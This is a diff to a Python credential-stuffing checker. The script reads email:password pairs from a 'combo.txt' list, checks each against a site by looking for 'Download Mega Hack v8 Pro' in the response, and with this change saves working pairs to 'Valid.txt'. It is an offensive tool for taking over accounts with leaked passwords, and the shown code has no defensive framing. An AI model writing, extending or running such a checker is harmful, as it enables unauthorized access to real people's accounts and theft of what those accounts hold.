@@ -28,8 +28,12 @@ print(color)
 choice = input("1 - Checking, 2 - Quit --> ")
 
 if not os.path.exists("combo.txt"):
-    with open("combo.txt", "w") as file:
-        print("File created, rerun program")
+    with open("combo.txt", "w") as f:
+        print("Combo TXT File created, rerun program")
+
+if not os.path.exists("Valid.txt"):
+    with open("Valid.txt", "w") as f:
+        print("Valid TXT File created, rerun program")
 
 if choice == "1":
  with open("combo.txt", "r") as f:
@@ -49,6 +53,8 @@ if choice == "1":
              print(Fore.RED + "[-]", Fore.WHITE + f"{email}:{passw}", "--> Bad")
          elif "Download Mega Hack v8 Pro" in response.text:
              print(Fore.GREEN + "[+]", Fore.MAGENTA + f"{email}:{passw}", "--> MegaHack available")
+             with open("Valid.txt", "a") as f:
+                 f.write(f"{email}:{passw}\n")
          elif "Buy Mega Hack v8 Pro" in response.text:
              print(Fore.RED + "[-]", Fore.WHITE + f"{email}:{passw}", "--> No MegaHack")
 
